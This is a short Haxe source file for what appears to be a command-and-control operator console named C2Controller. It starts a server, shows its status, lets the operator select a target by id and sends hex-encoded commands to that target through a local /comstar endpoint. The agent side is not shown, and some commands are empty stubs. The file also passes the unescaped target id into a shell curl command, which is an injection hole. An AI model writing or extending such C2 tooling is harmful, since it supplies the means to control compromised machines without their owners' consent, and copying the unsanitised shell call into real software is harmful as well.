import sys.io.Process;
using haxe.io.Bytes;

class C2Controller {
    static public function main() {
        Sys.println("Starting server...");
        var proc = new Process('make server');

        var line = "";
        var context = null;
        while (line != "quit" && line != "q") {
            Sys.print('${context != null ? context : "(root)"}> ');
            line = Sys.stdin().readLine();
            if (line == "help") {
                Sys.println("help:");
                Sys.println("\t status - view server status");
                Sys.println("\t stuff - do stuff");
                Sys.println("\t help - do help");
                Sys.println("\t quit - leave");
            } else if (line == "status" || line == "s") {
                Sys.println(new sys.io.Process("curl http://localhost:8000/status").stdout.readAll().toString());
            } else if (line == "view" || line == "v") {
            } else if (line.substring(0, 5) == "view " || line.substring(0, 2) == "v ") {
                var id = line.substring(line.indexOf(" ") + 1);
                context = id;
            } else if (line.substring(0, 3) == "cm " || line.substring(0, 2) == "c ") {
                var command = line.substring(line.indexOf(" ") + 1);
                command = Bytes.ofString(command).toHex();
                Sys.println(new sys.io.Process('curl "http://localhost:8000/comstar?id=${context}&com=${command}"').stdout.readAll().toString());
            } else if (line == "quit" || line == "q") {
                Sys.println("Goodbye!");
                return;
            } else if (line == "") {
            } else {
                Sys.println("invalid cmd: " + line);
            }
        }
    }
}
